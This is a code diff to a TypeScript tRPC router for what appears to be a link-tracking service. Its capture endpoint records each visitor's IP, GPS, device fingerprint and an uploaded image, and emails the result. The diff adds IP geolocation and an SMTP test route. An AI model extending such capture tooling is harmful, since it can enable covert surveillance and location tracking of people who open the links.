@@ -1,4 +1,6 @@
 import { COOKIE_NAME } from "@shared/const";
+import { getIpLocation } from "./ipGeo";
+import { testSmtpConnection } from "./email";
 import { getSessionCookieOptions } from "./_core/cookies";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
@@ -28,8 +30,25 @@ export const appRouter = router({
       const pass = process.env.SMTP_PASS;
       return {
         configured: Boolean(host && user && pass),
+        host: host || "",
+        port: process.env.SMTP_PORT || "465",
+        user: user || "",
+        recipient: process.env.NOTIFICATION_EMAIL || user || "",
       };
     }),
+    testSmtp: protectedProcedure
+      .input(
+        z.object({
+          host: z.string(),
+          port: z.number(),
+          user: z.string(),
+          pass: z.string(),
+        })
+      )
+      .mutation(async ({ input }) => {
+        await testSmtpConnection(input);
+        return { success: true };
+      }),
   }),
 
   tracking: router({
@@ -94,7 +113,10 @@ export const appRouter = router({
         }
 
         const forwarded = ctx.req.headers["x-forwarded-for"];
-        const ip = typeof forwarded === "string" ? forwarded.split(",")[0] : ctx.req.socket.remoteAddress || "unknown";
+        const rawIp = typeof forwarded === "string" ? forwarded.split(",")[0] : ctx.req.socket.remoteAddress || "unknown";
+        const cleanIp = rawIp.trim();
+        const location = await getIpLocation(cleanIp);
+        const ipWithLoc = `${cleanIp} (${location})`;
         const userAgent = ctx.req.headers["user-agent"] || "unknown";
 
         const base64Data = input.imageBase64;
@@ -120,7 +142,7 @@ export const appRouter = router({
         await db.createCapture({
           id: captureId,
           linkId: input.linkId,
-          ip: ip.trim(),
+          ip: ipWithLoc,
           gps: input.gps || "Nicht verfügbar",
           fingerprint: input.fingerprint || "Unbekannt",
           resolution: input.resolution || "Unbekannt",
@@ -131,7 +153,7 @@ export const appRouter = router({
 
         sendCaptureNotification({
           linkId: input.linkId,
-          ip: ip.trim(),
+          ip: ipWithLoc,
           gps: input.gps || "Nicht verfügbar",
           resolution: input.resolution || "Unbekannt",
           filePath: s3Result.url,
